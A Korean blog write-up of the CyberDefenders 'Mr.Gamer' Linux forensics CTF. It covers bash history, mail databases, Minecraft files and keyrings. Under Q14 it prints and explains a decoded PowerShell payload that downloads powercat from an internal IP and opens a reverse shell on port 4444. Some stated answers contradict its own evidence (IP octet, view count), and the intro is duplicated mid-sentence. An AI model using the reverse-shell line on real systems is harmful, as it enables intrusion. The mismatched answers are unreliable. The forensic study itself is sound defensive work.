**해당 풀이는 cyberdefenders.org의 blueteam-ctf-challenges에서 Mr.Gamer라는 문제를 푸는 과정을 보여주고 있습니다.<br>**
https://cyberdefenders.org/blueteam-ctf-challenges/mrgamer/<br><br><br><br>



**Introduction**<br><br>

Scenario : This #Linux image belongs to a user who likes to play games and communicate with friends.<br>
Is there something happening under the hood? Test drive your #LinuxForensics skills and identify anomalies!<br>
As a soc analyst, analyze the artifacts and answer the questions.<br><br><br>


(문제 파일이 날아갔는데 다운로드 받는데 한참 걸려서 임시로 작성.)<br><br>

**Q1. I use print statements for my logging -> What is the name of the utility/library the user was looking at exploits for?<br><br>**

문제에서는 exploits에 사용한 유틸리티 또는 라이브러리를 물어보는 문제이다.<br>
exploits은 취약점 공격이란 것을 뜻하며, 컴퓨터의 소프트웨어나 하드웨어 및 컴퓨터 관당 풀이는 cyberdefenders.org의 blueteam-ctf-challenges에서 Mr.Gamer라는 문제를 푸는 과정을 보여주고 있습니다.<br>
https://cyberdefenders.org/blueteam-ctf-challenges/mrgamer/<br><br><br><br>



**Introduction**<br><br>

Scenario : This #Linux image belongs to a user who likes to play games and communicate with friends.<br>
Is there something happening under the hood? Test drive your #LinuxForensics skills and identify anomalies!<br>
As a soc analyst, analyze the artifacts and answer the questions.<br><br><br>


(문제 파일이 날아갔는데 다운로드 받는데 한참 걸려서 임시로 작성.)<br><br>

**Q1. I use print statements for my logging -> What is the name of the utility/library the user was looking at exploits for?<br><br>**

문제에서는 exploits에 사용한 유틸리티 또는 라이브러리를 물어보는 문제이다.<br>
exploits은 취약점 공격이란 것을 뜻하며, 프로그램의 결함, 버그, 보안 취약점 등을 이용하여 프로그램이 예기치 않게 동작하게 만드는 개체 또는 방법을 말한다.<br><br>

어떠한 명령어를 입력했는지 보기 위해서는 bash_history를 살펴보면 된다.
![1-1](https://github.com/user-attachments/assets/749ce14a-7412-4635-8fb3-197509c5abab)<br>
bash_history에는 Log4j라는 자바 관련 유틸리티를 에디터로 열어본 흔적이 나와있다.<br>
빨간 네모로 쳐져 있는 곳을 보면, Log4jRCE라는 글씨가 보인다. Log4j는 무엇을 뜻하는 것일까?<br><br>

Log4Shell이라고도 알려진 Log4j 취약점은 2021년 11월에 Apache Log4j 로깅 라이브러리에서 발견된 매우 심각한 취약점이며 Log4Shell은 기본적으로 해커에게 패치되지 않은 버전의 Log4j를 실행하는 디바이스를 완전히 제어할 수 있는 권한을 부여한다.<br><br>

즉, 정답은 **Log4j**이다.<br><br>

Log4j관련 파일을 더 찾아볼 수 있는데,<br>
root\home\rafael\apache-log4j-rce-poc 경로에서도 log4j 키워드가 존재하며<br><br>

웹 히스토리 경로인<br>
root\home\rafael\snap\firefox\common\.mozila\firefox\mcrcm1xn.default\places.sqlite에서도 공개적으로 알려진 소프트웨어의 보안취약점을 가리키는 고유 표기인 CVE 표시가 있기 때문에 Log4j라는 것을 확신할 수 있다.<br><br>

![1-2](https://github.com/user-attachments/assets/0db72b41-85a7-4831-b288-b29af17f32bf)<br>
참고로, 웹 히스토리 로그에서는사용자는 minecraft라는 게임의 취약점을 알아내기 위해 youtube에서 CVE-2021-44228 Log4j라는 취약점을 이용하고자 했다.<br>
MINECRAFT VULNERABLE 사용자의 사진 디렉터리에 스크린샷에도 Log4j 관련 사진들이 포함되어 있다.<br>
hacking tools라는 검색어를 Google에 검색하기도 하였으며, 25 Best Ethical Hacking Tools & Software for Hackers (2022)라는 제목의 사이트를 통해 Ethical Hacking을 위한 도구들을 수집하려는 의도가 보여지고 있다.<br><br><br><br>



**Q2. Mischievous Lemur -> What is the version ID number of the operating system on the machine?<br><br>**

2번 문제는 설치된 운영체제의 버전을 물어보는 문제이다.<br>
리눅스의 운영체제 버전은 root\etc\issue 혹은 /etc/os-release, /etc/lsb-release에 저장되어 있다.<br><br>
![1_I0Sz0BUfnRpEboAlL1t4mQ](https://github.com/user-attachments/assets/be24116d-8884-4b3a-9570-34d5bb750a4f)<br>
위 사진은 Autopsy 프로그램을 이용하여 /etc/lsb-release 파일을 확인해 본 결과이며,<br>
DISTRIB_DESCRIPTION='Ubuntu 21.10' 이라고 나와있다.<br><br>

즉, 2번 문제에서 물어보는 설치된 운영체제의 버전은 **Ubuntu 21.10**이다.<br><br><br><br>



**Q3. $whoami -> What is the hostname of the computer?<br><br>**

3번 문제는 컴퓨터의 hostname이 누구인지 물어보는 문제이다.<br> hostname이란 사용자가 컴퓨터에 등록해둔 장치 이름이다.<br>
리눅스에서 hostname은 root\etc\hostname에 저장이 되어 있다.<br><br>

![1_CNlx8xQ9Es91y1xrP_4kbg](https://github.com/user-attachments/assets/9ac2107d-befb-4cba-94c3-c316f60853cd)<br>
사진을 참고하면 **rshell-lenovo**라는 사용자명이 보여지고 있다.<br><br><br><br>



**Q4. A little blue birdie told me -> What is one anime that the user likes?<br><br>**

4번 문제에서는 작은 파랑새가 나에게 '사용자가 가장 좋아하는 애니메이션이 무엇일까?'라고 묻는 문제이다.<br>
작은 파랑새라는 키워드를 들었을 때 먼저 생각난 것은 twitter였다.<br><br>

![1-3](https://github.com/user-attachments/assets/cd4122ca-e650-41ff-8505-51aa0c510dcc)<br>
![20231117_151512](https://github.com/user-attachments/assets/61d141a3-8260-4a47-a8c3-43863b96ff4e)<br><br>

그렇기에 웹 히스토리 상에 남아있는 트위터 관련 히스토리를 보았는데 NASCAR라는 스포츠 관련 계정만 탐방하는 것으로 보아,<br>
애니메이션 관련 부분은 찾아볼 수 없었다.<br><br>

파랑새 관련 프로그램을 생각하다가 Mozilla에서 개발한 이메일 소프트웨어인 'ThunderBird'를 생각할 수 있었다.<br><br>

ThunderBird 프로그램은 주고 받은 메시지를 검색할 수 있게 해주는 인덱싱 시스템 파일을 가지고 있었다.<br>
경로는 root\home\rafael\.thunderbird\vrvcx2qf.default-release\global-messages-db.sqlite이다.<br><br>

.sqlite 파일은 DB Browser for sqlite를 이용해서 메일의 내용을 자세하게 볼 수 있다.<br><br>

![1_I0Sz0BUfnRpEboAlL1t4mQ](https://github.com/user-attachments/assets/7e18652b-659b-4d5b-bc2c-96a739da1205)<br>
대화 내용들을 살펴보면, 38번째 줄에서 애니메이션 관련 키워드를 확인할 수 있다.<br><br>

![20231117_151538](https://github.com/user-attachments/assets/9241708c-6336-4416-b493-b3cc4fa0fa24)<br>
내용을 자세히 살펴보면 위 사진과 같다.<br><br>

![1-4](https://github.com/user-attachments/assets/5a4dafb0-bd66-4d3d-97e8-8720c26162ad)<br>
링크를 따라 들어가게 되면 사용자가 서칭하던 애니메이션이 나온다. Attack on Titan이 바로 그 사용자가 즐겨보는 애니메이션이며<br>
한국어로 '진격의 거인' 애니메이션이다.<br><br>

따라서, 4번 문제의 정답은 **Attack on Titan**이다.<br><br><br><br>



**Q5. Into the Matrix, we go -> What is the UUID for the attacker's Minecraft account?<br><br>**

1번 문제에서 확인할 수 있듯이, 사용자는 Minecraft라는 게임 관련 취약점을 찾고 있었다.<br>
5번 문제에서는 공격자가 사용한 마인크래프트의 UUID를 물어보는 문제이다.<br>
UUID는 Universally Unique IDentifier의 약어이고 범용 고유 식별자라고 하며 주로 분산 컴퓨팅 환경에서 사용되는 식별자이다.<br>
쉽게 말해 ID를 찾으면 된다.<br><br>

마인크래프트라는 게임은 .minecraft라는 폴더에 관련 파일이 모두 저장되어 있다. 그렇기에 우리는 .minecraft 파일을 뒤적뒤적 해봐야 한다.<br><br>

![1_Oaju91iXkLkSKVBxAiRyYQ](https://github.com/user-attachments/assets/dbca17b8-b4d8-4d56-b933-4265e862154d)<br>
사용자의 UUID를 묻는 질문이니 계정 관련 파일로 보이는 launcher_accounts.json 파일을 살펴볼 수 있다.<br><
역시나, 해당 파일은 ID를 담고 있다.<br><br>

참고로, 계정을 생성하는 타 게임들과 달리 마인크래프트는 하나의 계정으로 여러 월드를 생성을 한다.<br>
그렇기에 월드 파일을 저장하는 경로인 root\home\rafael\.minecraft\saves\1_1_8 world\playerdata<br>
에서도 [uuid].dat 파일을 확인할 수 있는데, 위에서 발견한 uuid와 비교했을 때 동일한 아이디임인 것을 보아 확신을 할 수 있다.<br>
5번 문제의 정답은 **8b0dec19-b463-477e-9548-eef20c861492**이다. 마인크래프트라는 게임을 접해봤으면 맨땅에 헤딩도 가능했을 것 같은 문제이다.<br><br><br><br>



**Q6. Today's Youtube video is sponsored by... -> What VPN client did the user install and use on the machine?<br><br>**

6번 문제에서는 사용자가 시스템에 설치하고 사용한 VPN Client를 물어보는 문제이다.<br>
VPN이란? Virtual Private Network로 공중 네트워크를 통해 한 회사나 몇몇 단체가 내용을 외부로 드러내지 않고 통신할 목적으로 쓰이는 사설 통신망이다.<br><br>

우리는 1번 문제에서 bash_history에서 사용자가 사용한 명령어를 볼 수 있었던 것을 상기하며 다시 히스토리를 보게 되면,<br>
![20231117_152345](https://github.com/user-attachments/assets/2405d168-17b3-4af9-afa7-ffa754d9bebe)<br>
curl -s https://install.zerotier.com | sudo bash 라는 명령어를 입력한 것을 볼 수 있다.<br>
zerotier는 가상 소프트웨어 네트워크를 만들고 관리하는 회사이다.(구글링) 그렇기에 VPN과 관련이 있다고 생각해볼 수 있다.<br><br>

확신할 수 있는 근거가 없어서 여기저기 둘러다니던 중, \etc\openvpn\이라는 경로가 있어 확인해보았지만 비어있었다....<br><br>

![1-5](https://github.com/user-attachments/assets/49842593-4bdb-47f9-b1a2-377f429a01e0)<br>
그러다가 root\home\rafael\Pictures\Screenshot from 2022-02-08 22-41-44.png 파일에서 하나의 스크린샷을 발견하게 되었는데,<br>
해당 스크린샷에서는 ZeroTier라는 프로그램을 사용하는 사용자의 화면이 스크린샷 되어있는 것을 볼 수 있다.<br><br>

따라서.... 6번 문제의 정답은 **ZeroTier**가 되겠다.<br><br><br><br>



**Q7. Be our guest -> What was the user's first password for the guest wifi?<br><br>**

7번 문제에서는 게스트 와이파이를 위한 사용자의 첫 번째 비밀번호를 물어보고 있다.<br><br>

![1_HVYXjpNtRHDK_OnO5ywPNg](https://github.com/user-attachments/assets/3df0888d-5976-4be3-a362-ba51af6ce229)<br>
4번 문제를 풀 때 보았던, DB Browser for sqlite를 이용해서 메일의 내용을 볼 때 추출을 했던 global-message-db를 보면<br><br>

![20231117_152930](https://github.com/user-attachments/assets/cb761a7c-a9bb-484f-9390-bc98c8ec6e56)<br>
3개의 와이파이 비밀번호가 나와있다.<br><br>

문제에서는 사용자의 첫 번째 비밀번호를 물어보고 있으니, 정답은 **679670**이 된다.<br><br><br><br>



**Q8. If a picture is worth a thousand words, how many is a video worth? -> The user watched a video that premiered on Dec 11th, 2021. How many views did it have when they watched it on February 9th?<br><br>**

8번 문제에서는 사용자가 2021년 12월 11일에 어떠한 비디오 영상을 보았고, 2월 9일에도 같은 영상을 보았는데 그 영상의 조회수를 물어보는 문제이다.<br><br>

웹 히스토리를 통해 유튜브를 들어갔다고 생각을 해보면 2023년 기준으로 조회수가 나오기 때문에 정답이 아닌데 6번 문제에서 스크린샷을 확인하다가 유튜브 관련 스크린샷을 하나 보았다.<br><br>

root\home\rafael\Pictures\Screenshot from 2022-02-09 16-42-10.png<br>
root\home\rafael\Pictures\Screenshot from 2022-02-09 17-31-17.png<br>
root\home\rafael\Pictures\Screenshot from 2022-02-09 17-42-23.png<br>
3가지 스크린샷 중 가장 먼저 찍힌 16시 42분 10초의 사진을 보면,<br><br>

![1-6](https://github.com/user-attachments/assets/a5acbf6f-cc10-455d-9c4f-8506b790692c)<br>
따란... 265,345 views - Premiered Dev 11, 2021이라는 것을 확인할 수 있다.<br><br>

따라서 8번 문제의 정답은 **2653452**가 되겠다.<br><br><br><br>



**Q9. I'm hungry for videos -> What is the new channel name for the YouTuber whose cookbook is shown on the device?<br><br>**

9번 문제에서는 pc에서 보여진 요리책을 쓴 유튜버의 새로운 채널 이름을 물어보고 있다.<br><br>

![20231117_153635](https://github.com/user-attachments/assets/6b34b0ab-5d03-4d72-9daa-7e4d88415316)<br>
사진 관련된 파일을 여기저기 찾아다니다보니 \thumbnails 폴더에서 사진과 같이 BINGING WITH BABISH라는 음식이 그려져있는 책 있는 사진을 발견하게 되었다.<br><br>

![1_kFvBt8mharIUP_Ig9oStyQ](https://github.com/user-attachments/assets/a5dc57f0-3fb3-4876-b0a6-8f3dece16594)<br>
구글에 BINGING WITH BABISH를 검색하니 한 유튜브 채널이 나왔고 그 채널의 이름은 **Babish Culinary Universe**였다.<br><br><br><br>



**Q10. Hunt the Wumpus ->
What is the module with the highest installed version for the chat application with the mascot Wumpus?<br><br>**

10번 문제에서는 채팅 어플리케이션의 가장 최신 모듈 버전을 물어보는 문제이다.<br>
mascot Wumpus을 구글에 검색해보면 Discord 프로그램의 마스코드라고 나오고 있다.<br>
즉, 문제에서는 디스코드 프로그램의 버전을 물어보는 것이다.<br><br>

root\home\rafael\.config\discord\0.0.16\modules\installed.json<br>
냅다 디스코드 관련 파일 위치를 찾아냈다. installed.json을 확인해보니<br><br>

![20231117_154122](https://github.com/user-attachments/assets/ee83cfb4-98b3-43c0-9412-020f3bdaf1c2)<br>
다음과 같은 로그를 볼 수 있었는데, 가장 최신 버전을 보면 5로 되어있는 **discord_voice**가 최신 버전임을 알 수 있었다.<br><br><br><br>



**Q11. It's raining ocelots and wolves -> According to Windows, what was the temperature in Fahrenheit on February 11th, 2022, at 6:30 PM?<br><br>**

11번 문제는 윈도우에 저장된 2022년 2월 11일, 오후 6시 30분 화씨 온도를 찾는 것이다.<br>
Thumbnails 파일에 다시 가서 확인해보면<br><br>

![20231117_154801](https://github.com/user-attachments/assets/2df94a9c-e054-45f1-9a33-6ce7c4e288d7)<br>
오른쪽 아래에 2022년 2월 11일, 오후 6시 30분이라는 것과 왼쪽 아래에 온도가 **45F**로 표시되어 있음을 확인할 수 있다.<br><br><br><br>



**Q12. Never gonna give... up on this question -> What is the upload date of the second youtube video on the channel from which the user downloaded a youtube video?<br><br>**

12번 문제는 사용자가 유튜브 영상을 다운로드 하였고, 이 영상을 다운 받은 채널의 2번째 영상이 업로드된 날짜를 물어보고 있다.<br><br>

![20231117_155614](https://github.com/user-attachments/assets/a11ba0c9-e9a8-4bc2-a6a0-b5bcab8bce24)<br>
다운로드 파일 경로인 root\home\rafael\Downloads\을 향해보면 Rick Astley - Never Gonna Give you up 음악 파일이 다운로드 되어 있다.<br><br>

Rick Astley의 유튜브 채널에서 다운로드를 하였으니, 두 번째로 업로드 된 영상의 날짜를 확인해보면 된다.<br>
![20231117_155759](https://github.com/user-attachments/assets/069b41ba-882a-4fb7-a273-4096e2afc26d)<br>
**2009년 10월 25일**에 업로드되었다.<br><br><br><br>



**Q13. Buzzy Bees -> What is the SHA-1 hash of Minecraft's "latest" release according to the system?<br><br>**

마인크래프트의 최신 릴리스 SHA-1 해시값을 물어보는 문제이다.<br>
.minecraft 디렉토리로 향하며 versions 폴더에 들어가보면 version_manifest_v2.json이라는 파일을 확인할 수 있다.<br><br>

![20231117_160054](https://github.com/user-attachments/assets/80b79426-8d04-46f1-962d-4acb0e2e2ef9)<br>
해시값은 **3c6e119c0ff307accf31b596f9cd47ffa2ec6305**이다.<br><br><br><br>



**Q14. he RCE is base(64)d on what? -> What were the three flags and their values that were passed to powercat? The answer must be provided in the same format as the entered command. (For example, if the command was "powercat -D Y -l a -n," the answer would be "-D Y -l a -n")<br><br>**

간단히 말하자면 base64로 인코딩 된 powercat의 명령어를 알아내는 문제이다.<br><br>

문제에서 Powercat을 언급했기에, 히스토리로 다시가서 powercat에 대한 로그들을 확인하다가...<br><br>

Log4jRCE.java 파일을 수정하는 모습을 확인할 수 있었고, marshalsec/poc/ 경로로 파일을 복사한 것을 확인할 수 있었다.<br><br>

경로를 따라가 Log4jRCE.java의 내용을 보게 되면<br>
![20231117_160520](https://github.com/user-attachments/assets/23a9b12a-9ae7-4028-9adb-b51b2cdc3f16)<br>
위와 같은 사진을 확인할 수 있었고, 문제에서 base64로 인코딩이 되어있다고 언급했으므로, base64로 디코딩을 다시 해보면,<br><br>

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.191.253:8000/powercatps1');
powercat -c 192.168.191.253 -p 4444 -e cmd"<br><br>

음.... chatpgt 도와줘!<br>

IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.191.253:8000/powercatps1'):<br>
IEX는 PowerShell에서 명령을 즉시 실행하는 기능(Invoke-Expression)이다.<br>
New-Object System.Net.WebClient는 새로운 웹 클라이언트 객체를 생성하는 명령어다.<br>
DownloadString('http://192.168.191.253:8000/powercatps1')는 지정된 URL로부터 문자열(스크립트)을 다운로드한다.<br>
이 부분 전체는 http://192.168.191.253:8000/powercatps1에서 스크립트를 다운로드하고, 그 스크립트를 즉시 실행하라는 의미이다.<br><br>

powercat -c 192.168.191.253 -p 4444 -e cmd:<br>
powercat는 PowerShell 환경에서 Netcat과 유사한 기능을 제공하는 툴이다.<br>
-c 192.168.191.253는 클라이언트 모드로 192.168.191.253 IP 주소의 서버에 연결하라는 옵션이다.<br>
-p 4444는 해당 서버의 4444 포트로 연결하라는 옵션이다.<br>
-e cmd는 연결이 이루어지면 명령 셸(cmd)을 실행하라는 의미이다.<br>
종합적으로, 이 명령어는 원격 서버에서 powercatps1 스크립트를 다운로드하고 실행하여, 로컬 컴퓨터를 192.168.191.253의 서버와 연결한 후, 명령 셸을 실행하도록 설정하는 것이다. 이러한 명령은 주로 원격 제어나 해킹, 침투 테스트 등의 목적으로 사용된다.<br><br>

yay~ 문제에서 물어보는 내용은 결국 **-c 192.168.192.253 -p 4444 -e cmd**가 된다.<br><br><br><br>



**Q15. Hello (New) World -> How many dimensions (including the overworld) did the player travel to in the "oldest of the worlds"?<br><br>**

다시 등장한 마인크래프트 관련된 문제이다. Mr.Gamer라는 문제 답게 게임 관련 질문이 쏟아지고 있는 중이다.<br>
문제는 가장 오래 전에 생성된 마인크래프트 월드에서 플레이어가 여행을 하는데, 얼마나 많이 dimensions를 탐험했냐고 묻고 있다.<br><br>

우선 .minecraft/saves에는 .이라는 파일, ..이라는 파일, 1_1_8 world라는 파일, New World라는 파일이 존재하는데 가장 오래된 New World 파일을 조사해보면 되겠다.<br><br>

마인크래프트에서는 오버월드/네더/엔드라는 3가지 차원이 존재한다. 즉, 플레이어가 오버월드, 네더, 엔드라는 3가지 차원을 이동한 횟수를 물어보는 문제이다.<br><br>

위 마인크래프트 관련 문제를 풀 때, root\home\rafael\.minecraft\saves\ 경로로 향하였는데<br>
New World라는 파일을 보면 DIM1, DIM-1 등이 있는데 DIM은 dimension의 줄임말로 보이며 DIM1, DIM-1 디렉토리 안에는 정보들이 들어있지 않다.<br><br>

그 말인 즉슨, 기본으로 플레이어가 스폰하는 월드인 오버월드를 제외하고는 DIM1, DIM-1이라는 차원으로 이동을 하지 않았다는 소리가 된다.<br>
문제에서는 오버월드를 포함하여 물어보고 있기 때문에 답은 **One**이 된다.<br><br><br><br>



**Q16. Matrix_1999 is the key! -> What is the mojangClientToken stored in the Keystore?<br><br>**

16번 문제는 mojangClientToken을 찾는 문제다.<br>
이전 문제들에 비해 난이도가 올라간 문제인데,<br><br>

첫 번째로, keystore을 찾아볼 것이다.<br><br>

sudo find /mnt/Linux -name "*.keystore"<br>
#returns /mnt/Linux/home/rafael/.local/share/keyrings/user.keystore><br><br>

그 후,  사용자의 keystore을 sudo find /mnt/Linux -name "*.keystore" 명령어를 통해 keyrings 디렉토리에 복사한 뒤 이름을 바꾸었다.<br><br>

cp /mnt/Linux/home/rafael/.local/share/keyrings/user.keystore /home/remnux/.local/share/keyrings/rafael.keystore<br>
그 후, Passwords and Keys를 가상머신에서 오픈을 해주었꼬, Matrix_1999라는 비밀번호를 통해 잠금해제하였다.<br><br>

![MRGAMER_16_00](https://github.com/user-attachments/assets/d0b683c1-9f32-432e-b425-4b2d326f0f56)<br>
쭉 아래로 내리다보면 mojangClientToken을 찾을 수 있었다. 그리고 이것을 복사하여 터미널에 값을 얻기 위해 붙여넣었다.<br><br>

![1_oOdf4NeldlO3WER03DKj9Q](https://github.com/user-attachments/assets/c16368e3-49d9-4009-a51b-bcb88eb9b0ed)<br>
값, **2f76c8b04c004ddd888a05a6cad6be52**을 획득하였다.<br><br><br><br>



16번 문제를 푸는데 조금 힘들어서 여기저기 서칭을 많이 하고 다녔던 것 같다.







